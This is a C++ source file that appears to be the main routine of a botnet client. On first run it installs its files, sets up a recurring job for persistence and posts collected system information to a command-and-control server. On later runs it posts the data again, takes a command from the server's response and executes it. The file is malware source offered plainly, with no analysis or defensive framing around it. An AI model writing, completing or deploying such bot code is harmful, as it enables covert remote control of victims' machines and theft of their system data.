#include <stdio.h>
#include <experimental/filesystem>
#include <fstream>
#include <string>

#include "bot.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;

int main() {
    fs::path install_dir = util::GetInstallDir();

    std::string register_url = C2_SERVER + REGISTER_URI;
    std::string command_url = C2_SERVER + CMD_URI;

    Installer install(install_dir);

    std::string auth_hash = install.GetAuthHash();
    sysinfo::DataList sysinfo(auth_hash);

    if(install.IsNew()) {
        install.InstallFiles();
        install.InitRecurringJob();

        // Create POST form from DataList and register C2 server
        std::string data = sysinfo.GetPostData();
        request::Post(register_url, data);
    } else {
        // Create POST form from DataList and get command from C2 server
        std::string data = sysinfo.GetPostData();
        std::string cmd_response = request::Post(command_url, data);

        // Parse JSON response from C2 server and execute command
        Command cmd(cmd_response);
        cmd.Execute();
    }

    return 0;
}
